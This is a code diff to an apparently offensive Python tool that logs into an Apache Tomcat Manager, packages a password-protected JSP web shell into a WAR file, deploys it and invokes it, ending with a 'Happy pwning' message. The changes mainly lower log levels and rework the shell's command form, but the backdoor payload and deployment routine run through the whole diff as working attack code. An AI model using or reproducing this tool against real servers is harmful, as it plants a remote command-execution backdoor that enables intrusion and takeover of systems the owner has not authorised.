@@ -36,7 +36,8 @@ import commands
 from BeautifulSoup import BeautifulSoup
 
 logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)
-logging.addLevelName( logging.WARNING, "\033[1;31m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
+logging.addLevelName( logging.DEBUG, "\033[1;32m%s\033[1;0m" % logging.getLevelName(logging.DEBUG))
+logging.addLevelName( logging.WARNING, "\033[1;35m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
 logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))
 logger = logging.getLogger()
 
@@ -44,7 +45,7 @@ logger = logging.getLogger()
 def generateWAR(code, title, appname):
     dirpath = tempfile.mkdtemp()
 
-    logging.info('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))
+    logging.debug('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))
 
     os.makedirs(dirpath + '/files/META-INF')
     os.makedirs(dirpath + '/files/WEB-INF')
@@ -56,9 +57,9 @@ def generateWAR(code, title, appname):
     m = re.search('version "([^"]+)"', javaver)
     if m:
         javaver = m.group(1)
-        logging.info('Working with Java at version: %s' % javaver)
+        logging.debug('Working with Java at version: %s' % javaver)
     else:
-        logging.info('Could not retrieve Java version. Assuming: "1.8.0_60"')
+        logging.debug('Could not retrieve Java version. Assuming: "1.8.0_60"')
         javaver = '1.8.0_60'
 
     with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
@@ -67,7 +68,7 @@ Created-By: %s (Sun Microsystems Inc.)
 
 ''' % javaver)
 
-    logging.info('Generating web.xml with servlet-name: "%s"' % title)
+    logging.debug('Generating web.xml with servlet-name: "%s"' % title)
     with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
         f.write('''<?xml version="1.0" encoding="ISO-8859-1"?>
 <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
@@ -92,23 +93,21 @@ Created-By: %s (Sun Microsystems Inc.)
     cwd = os.getcwd()
     os.chdir(dirpath)
     outpath = tempfile.gettempdir() + '/' + appname + '.war'
-    logging.info('Generating WAR file at: "%s"' % outpath)
+    logging.debug('Generating WAR file at: "%s"' % outpath)
     packing = commands.getstatusoutput('jar -cvf %s *' % outpath)
     os.chdir(cwd)
 
-    print packing[1]
+    logging.debug(packing[1])
 
     tree = commands.getstatusoutput('tree %s' % dirpath)[1]
     if not ('sh' in tree and 'tree: not found' in tree):
-        logging.info('WAR file structure:')
-        print tree
+        logging.debug('WAR file structure:')
+        logging.debug(tree)
 
     return (dirpath, outpath)
 
 def preparePayload(opts):
-    logging.info('Generating JSP WAR backdoor code...')
-    logging.warning('JSP Backdoor password set to: >>> "%s" <<<' % opts.shellpass)
-
+    logging.debug('Generating JSP WAR backdoor code...')
     payload = '''<%%@ page import="java.util.*,java.io.*"%%> <%%!
     public String execute(String pass, String cmd) {
         final String hardcodedPass = "%(password)s";
@@ -154,22 +153,20 @@ def preparePayload(opts):
                 <td>Password:</td><td style="width:100%%"><input type=password width=40 name="password" value='<%% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %%>' /></td>
             </tr>
             <tr>
-                <td>tomcat $ </td><td style="width:100%%"><input type=text size=100 name="cmd" value="uname -a" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" onclick='this.value=""'/></td>
+                <td>tomcat $ </td><td style="width:100%%"><input type=text size=100 name="cmd" value='<%% out.print((request.getParameter("cmd") != null) ? request.getParameter("cmd") : "uname -a"); %%>' onClick="this.select();" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" /></td>
             </tr>
             <tr>
-                <td><input type=submit name=submit value="Execute" /></td><td></td>
+                <td><input type=submit style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1"/></td><td></td>
             </tr>
         </table>
         </form>
         <hr />
-        <pre style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;height:100vh">
-        <%%
+        <pre style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;"><%%
             if (request.getParameter("cmd") != null && request.getParameter("password") != null) {
                 out.println("<br/>tomcat $ " + request.getParameter("cmd") + "<br/>");
                 out.println(execute(request.getParameter("password"), request.getParameter("cmd")));
             }
-        %%>
-        </pre>
+        %%></pre>
     </body>
 </html>''' % {'title': opts.title, 'password': opts.shellpass }
 
@@ -177,11 +174,10 @@ def preparePayload(opts):
 
 def invokeApplication(browser, url, appname):
     appurl = 'http://%s/%s/' % (url, appname)
-    logging.info('Invoking application at url: "%s"' % appurl)
+    logging.debug('Invoking application at url: "%s"' % appurl)
 
     try:
         resp = browser.open(appurl)
-        logging.info('Application returned:')
         return True
 
     except urllib2.HTTPError, e:
@@ -193,7 +189,7 @@ def invokeApplication(browser, url, appname):
     return False
 
 def deployApplication(browser, url, appname, warpath):
-    logging.info('Deploying application: %s from file: "%s"' % (appname, warpath))
+    logging.debug('Deploying application: %s from file: "%s"' % (appname, warpath))
     resp = browser.open(url)
     for form in browser.forms():
         action = urllib.unquote_plus(form.action)
@@ -218,7 +214,7 @@ def checkIsDeployed(browser, url, appname):
 
 def unloadApplication(browser, url, appname):
     appurl = 'http://%s/%s/' % (url, appname)
-    logging.info('Unloading application: "%s"' % appurl)
+    logging.debug('Unloading application: "%s"' % appurl)
     for form in browser.forms():
         action = urllib.unquote_plus(form.action)
         if url in action and '/undeploy?path=/'+appname in action:
@@ -246,7 +242,7 @@ def validateManagerApplication(browser):
     return (found >= len(actions))
 
 def browseToManager(url, user, password):
-    logger.info('Browsing to "%s"... Creds: %s:%s' % (url, user, password))
+    logger.debug('Browsing to "%s"... Creds: %s:%s' % (url, user, password))
     browser = mechanize.Browser()
     cookiejar = mechanize.LWPCookieJar()
     browser.set_cookiejar(cookiejar)
@@ -267,7 +263,7 @@ def browseToManager(url, user, password):
     src = page.read()
 
     if validateManagerApplication(browser):
-        logging.info('Apache Tomcat Manager Application reached & validated.')
+        logging.debug('Apache Tomcat Manager Application reached & validated.')
     else:
         logging.error('Specified URL does not point at the Apache Tomcat Manager Application')
         return None
@@ -351,23 +347,25 @@ def main():
         if checkIsDeployed(browser, url, opts.appname):
             logging.warning('Application with name: "%s" is already deployed.' % opts.appname)
             if opts.unload:
-                logging.info('Unloading existing one...')
+                logging.debug('Unloading existing one...')
                 if unloadApplication(browser, args[0], opts.appname):
-                    logging.info('Succeeded.')
+                    logging.debug('Succeeded.')
                 else:
-                    logging.info('Unloading failed.')
+                    logging.debug('Unloading failed.')
                     return
             else:
                 logging.warning('Not continuing until the application name is changed or current one unloaded.')
                 logging.warning('Please use -x (--unload) option to force existing application unloading.')
                 return
         else:
-            logging.info('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
+            logging.debug('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
 
         if deployApplication(browser, url, opts.appname, warpath):
-            logging.info('Succeeded, invoking it...')
-            invokeApplication(browser, args[0], opts.appname)
-
+            logging.debug('Succeeded, invoking it...')
+            if invokeApplication(browser, args[0], opts.appname):
+                logging.info("\033[0;32mJSP Backdoor up & running. Happy pwning, here take that password: '%s'\033[1;0m" % opts.shellpass)
+            else:
+                logging.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
         else:
             logging.error('Failed.')
 
@@ -375,7 +373,7 @@ def main():
         print '\nUser interruption.'
 
     if not opts.file and dirpath:
-        logger.info('Removing temporary WAR directory: "%s"' % dirpath)
+        logger.debug('Removing temporary WAR directory: "%s"' % dirpath)
         shutil.rmtree(dirpath)
 
 
